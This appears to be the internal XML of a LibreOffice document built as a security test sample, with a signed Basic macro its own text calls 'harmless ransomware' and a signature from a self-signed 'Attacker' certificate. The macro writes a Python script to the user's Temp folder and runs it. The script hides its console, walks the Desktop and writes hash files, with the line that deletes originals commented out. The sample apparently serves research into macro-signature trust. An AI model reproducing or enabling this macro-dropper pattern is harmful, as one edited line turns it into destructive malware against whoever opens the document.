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document contains a harmless ransomware macro created by Attacker! The macro creates hash files of all files on your desktop, but does not delete any file!</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="Standard">Macros were signed by Attacker using a self-signed certificate / private key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2T18:17:23.677000000</dc:date>
    <meta:editing-duration>PT11M37S</meta:editing-duration>
    <meta:editing-cycles>5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39" meta:character-count="236" meta:non-whitespace-character-count="19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	Dim oSFA As Object, oOutStream as Object, oOutText as Object
	Dim sFilePath as String
	
	oSFA = createUNOService ("com.sun.star.ucb.SimpleFileAccess")
	sFilePath = "C:\Users\" + environ("USERNAME") + "\AppData\Local\Temp\example_ransomware.py"
	If oSFA.exists(sFilePath) Then
		oSFA.kill(sFilePath) 'if file exists, delete it
	End If
	
	oOutStream = oSFA.openFileWrite(sFilePath)
	oOutText = createUNOService ("com.sun.star.io.TextOutputStream")
	oOutText.setOutputStream(oOutStream)
	
	oOutText.WriteString("import os" + Chr(13) + Chr(10))
	oOutText.WriteString("import getpass" + Chr(13) + Chr(10))
	oOutText.WriteString("import hashlib" + Chr(13) + Chr(10))
	oOutText.WriteString("import ctypes" + Chr(13) + Chr(10))
	oOutText.WriteString("ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )" + Chr(13) + Chr(10))
	oOutText.WriteString("" + Chr(13) + Chr(10))
	oOutText.WriteString("def hash_and_remove(file):" + Chr(13) + Chr(10))
	oOutText.WriteString("	with open(file, 'rb') as f:" + Chr(13) + Chr(10))
	oOutText.WriteString("		fblock = f.read(block_size)" + Chr(13) + Chr(10))
	oOutText.WriteString("		while len(fblock) &gt; 0:" + Chr(13) + Chr(10))
	oOutText.WriteString("			hash_obj.update(fblock)" + Chr(13) + Chr(10))
	oOutText.WriteString("			fblock = f.read(block_size)" + Chr(13) + Chr(10))
	oOutText.WriteString("	file_hashed = open(file + '.hashed','w')" + Chr(13) + Chr(10))
	oOutText.WriteString("	file_hashed.write(hash_obj.hexdigest())" + Chr(13) + Chr(10))
	oOutText.WriteString("	file_hashed.close()" + Chr(13) + Chr(10))
	oOutText.WriteString("#	os.remove(file)" + Chr(13) + Chr(10))
	oOutText.WriteString("" + Chr(13) + Chr(10))
	oOutText.WriteString("username = getpass.getuser()" + Chr(13) + Chr(10))
	oOutText.WriteString("path = 'C:\\Users\\' + username + '\\Desktop\\'" + Chr(13) + Chr(10))
	oOutText.WriteString("hash_obj = hashlib.sha256()" + Chr(13) + Chr(10))
	oOutText.WriteString("block_size = 65536" + Chr(13) + Chr(10))
	oOutText.WriteString("for root, dirs, files in os.walk(path):" + Chr(13) + Chr(10))
	oOutText.WriteString("	for file in files:" + Chr(13) + Chr(10))
	oOutText.WriteString("		file = path + file" + Chr(13) + Chr(10))
	oOutText.WriteString("		try:" + Chr(13) + Chr(10))
	oOutText.WriteString("			hash_and_remove(file)" + Chr(13) + Chr(10))
	oOutText.WriteString("		except:" + Chr(13) + Chr(10))
	oOutText.WriteString("			pass" + Chr(13) + Chr(10))

	Shell("C:\Program Files\LibreOffice\program\python.exe " + sFilePath)
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c000c0003200d7003300ae004d00d000b80066007f00c4008100b0008a004a">
    <SignedInfo>
      <CanonicalizationMethod Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
      <SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
      <Reference URI="Basic/Standard/Module1.xml">
        <Transforms>
          <Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
        </Transforms>
        <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <DigestValue>pwtcmxzxmpONzlS9ENx0e0DIbOyxHbG2AviwpuAHcsA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#ID_00ef0023000d000000b100c0004600b500950037000c0040001c00ab00610087">
        <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <DigestValue>psdEW1vNN5rEN8SUecs7ju54mOZJVjO1HpPLOxsV+ic=</DigestValue>
      </Reference>
      <Reference URI="#idSignedProperties" Type="http://uri.etsi.org/01903#SignedProperties">
        <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <DigestValue>KAe+72XSO3IOpQpzQJhSH7C1DWX8R76DodwshuxEHek=</DigestValue>
      </Reference>
    </SignedInfo>
    <SignatureValue>hyS2OxDs0KjYXpNHHX0Q9qJj98ocv/7vLwv+D+irzwEkE4NayN11P3+Mld7EfHPI
3jA1lQThMtwmKI+7mR0m2YxLv8R0Y0wFzLNUvSPvHFIL//UfInOEEsIbnX7TwhuH
V/3BwwO21+SRl3suTw9/kpGMylUPVo2mG4XUvu7/mEAp0RCiY+2VNs3iJ33DY9L9
QfnIUP3ZfuA4n3IF5JHysJgExyernj7xrgcNFSDsp8ff6yaTpzaOGLSfzrb1ajvm
g1rEOVms+4T9u/yZVweVbvmQc1AxNUVLdr1T75RuZlsdE77u7gV2ZWUL/dB1yuTo
OF/PWxcyonfzj6lM+SxH8w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  <X509Data>
        <X509IssuerSerial>
          <X509IssuerName>C=DE, E=attacker@odf.evil, CN=Attacker</X509IssuerName>
          <X509SerialNumber>561695420339045612699057</X509SerialNumber>
        </X509IssuerSerial>
        <X509Certificate>MIIFHDCCBASgAwIBAgIUWOXs9lLclAWdmWJTvdd5SmjIx4owDQYJKoZIhvcNAQEL
BQAwTDELMAkGA1UEBhMCQ0gxEDAOBgNVBAoTB1dJU2VLZXkxKzApBgNVBAMTIldJ
U2VLZXkgQ2VydGlmeUlEIFBlcnNvbmFsIEdCIENBIDQwHhcNMjIwMjEwMTUzNDI3
WhcNMjIwNTExMTQ0NDAwWjCBmDFCMEAGA1UECww5UGVyc29uJ3MgSWRlbnRpdHkg
bm90IFZlcmlmaWVkIC0gV0lTZUlEIEZyZWUgQ2VydGlmaWNhdGVzMSUwIwYDVQQD
DBx0cnVzdGVkLnBlcnNvbi5vZGZAZ21haWwuY29tMSswKQYJKoZIhvcNAQkBFhx0
cnVzdGVkLnBlcnNvbi5vZGZAZ21haWwuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOC
AQ8AMIIBCgKCAQEAnmTs5AtJ2EmImpEknmq6zdWEILLmQiiarTmigqsBMntesnUi
Enk9TFuv6G9hMMbFmCJDy9PMhDTcfZZY5jah3ZjZd1IUmAGilCW4h68KTMufPKfg
weiGZnqCXuZdboH7JxMxPihLov0iCqHPFFH9xXY0jGG9RkCYhl2b56ivvwNpkTCD
1bP0DCqpF7xFZFigBmTYMB9U3VPnAg+hocl8lF2fe13/dYUSPs6tR44KyKIRdnfj
6oTTI/pUlChPUMtot4vNgGlkNw/+aOiCFkhVKqidL22PCgrZUyCsEzD/h5Q8L2K9
/xxVSpAzzFNRhSeulGdRXArjT+05Y+zBjXPPsQIDAQABo4IBpzCCAaMwDAYDVR0T
AQH/BAIwADAfBgNVHSMEGDAWgBTbaCwDV3rMPWxpoTmgm7+wihlXsTBwBggrBgEF
BQcBAQRkMGIwOwYIKwYBBQUHMAKGL2h0dHA6Ly9wdWJsaWMud2lzZWtleS5jb20v
Y3J0L3djaWRwZXJzZ2JjYTQuY2VyMCMGCCsGAQUFBzABhhdodHRwOi8vb2NzcC53
aXNla2V5LmNvbTAnBgNVHREEIDAegRx0cnVzdGVkLnBlcnNvbi5vZGZAZ21haWwu
Y29tMEcGA1UdIARAMD4wPAYIYIV0BQ4HBAEwMDAuBggrBgEFBQcCARYiaHR0cDov
L3d3dy53aXNla2V5LmNvbS9yZXBvc2l0b3J5LzBABgNVHR8EOTA3MDWgM6Axhi9o
dHRwOi8vcHVibGljLndpc2VrZXkuY29tL2NybC93Y2lkcGVyc2diY2E0LmNybDAd
BgNVHQ4EFgQU+DXlKPw/8UzjxvBEo+QGJDjrgWcwHQYDVR0lBBYwFAYIKwYBBQUH
AwIGCCsGAQUFBwMEMA4GA1UdDwEB/wQEAwIFoDANBgkqhkiG9w0BAQsFAAOCAQEA
LTdfqbp4+dIEhFG6b7KLGVdWAgrrEFoUveMiLIGVfaP+k+Q4RM8pNQtvgbjjVUfw
FYuOlCIEEhBBHAfF59/4CPXn8ySxI+J2rH48UC3nrxf8OlPxxY/KAbuweorIlLtm
2P/LhnrvO8CXn8g3uW5DRQLgk0cW7go9pawJqOEwHuPXZQF8hUBAqOlJzWU+MeFS
unVhQ8k9tc2PcFYZYlvp8Rgy0udDgJVeFcn0QEruvEL+RlIhrmDPtPrUzYAdLOMz
xGjcvBVWHiXpatNXjD0XAUg7HLxQ4NjXl0eZeFTb1YoRnJt/SQ6wfA9BiqN/wc26
FKY8qLg8QRscubNgex1DMA==</X509Certificate>
      </X509Data>
    </KeyInfo>
    <Object>
      <SignatureProperties>
        <SignatureProperty Id="ID_00ef0023000d000000b100c0004600b500950037000c0040001c00ab00610087" Target="#ID_00c000c0003200d7003300ae004d00d000b80066007f00c4008100b0008a004a">
          <dc:date xmlns:dc="http://purl.org/dc/elements/1.1/">2021-10-12T18:17:44.253000000</dc:date>
        </SignatureProperty>
      </SignatureProperties>
    </Object>
    <Object xmlns:xd="http://uri.etsi.org/01903/v1.3.2#">
      <xd:QualifyingProperties Target="#ID_00c000c0003200d7003300ae004d00d000b80066007f00c4008100b0008a004a">
        <xd:SignedProperties Id="idSignedProperties">
          <xd:SignedSignatureProperties>
            <xd:SigningTime>2021-10-12T18:17:44.253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=DE, E=attacker@odf.evil, CN=Attacker</X509IssuerName>
                  <X509SerialNumber>561695420339045612699057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KDCCAhCgAwIBAgIKdvGR2yh62BS9sTANBgkqhkiG9w0BAQsFADBCMREwDwYDVQQDEwhBdHRhY2tlcjEgMB4GCSqGSIb3DQEJARYRYXR0YWNrZXJAb2RmLmV2aWwxCzAJBgNVBAYTAkRFMB4XDTIxMDEyMTE0Mjk1N1oXDTI2MDEyMTE0Mjk1N1owQjERMA8GA1UEAxMIQXR0YWNrZXIxIDAeBgkqhkiG9w0BCQEWEWF0dGFja2VyQG9kZi5ldmlsMQswCQYDVQQGEwJERTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAK6osofLCTQlnLYygA1uvjSYBq11H49cWXyml1dBDaB11uRN+kDu4ZvnU405+28c44YMce+peNMClsVIQ5xcUOiDMDJhhtx/75txdYyk66SSxQT4u7FnleqJNDbNvmQRB9DJu59Yx02GOfCn7ILVDQHvlZGMTEapdYDB5pRtVHgNNm20p3oTVd+112Kk3RouF63QZIvB1mOVyWxD/fq2FcXdQickeKVZjglXgx+Yy4F8ZYXfFTUBrfYwruBQr/laAwy4nLjrYC6pRlw8OUHeGnoQx3XXUl0BE7pM96R6Rt0ZPnr9a2hCc1A1FsrEwnoMWKl/aWJ3Us9jiXsa14x65O0CAwEAAaMgMB4wDwYJKoZIhvcvAQEKBAIFADALBgNVHQ8EBAMCB4AwDQYJKoZIhvcNAQELBQADggEBAIzYjXj/rx3b/qopHCguCRJunMU9iRBAXEuiGbNMT6UxlPFpqTNbyqIbEC+jSDQ3A+JKM5RIQDYpyhURJ4ZYUeQ41MuShoPTMB3P0i4QAmYXdXkIcyRAcx4UMN0mNc5ZWz3NqT765RzfU4ZJFnluIz+GEf7zOZx5hxTKHSLrUItN3T9JkJrIwKOaalbehXosiKhbL7dKCO/fTGS9VT1NM0tmZ+Ln9h0kVjgYUJWOGOnMAEkDWQAIAaOiQUAtBK41+q5Ki1QWW3A7pTTF0luZMaaot2Ab0hhBY6sm78+r4Ad4Kv9HLawUH6sMU0mQ1Ke1Cz5oHYh9SG9QuPvSAd+eI9U=</xd:EncapsulatedX509Certificate>
            </xd:CertificateValues>
          </xd:UnsignedSignatureProperties>
        </xd:UnsignedProperties>
      </xd:QualifyingProperties>
    </Object>
  </Signature>
</document-signatures>
</file>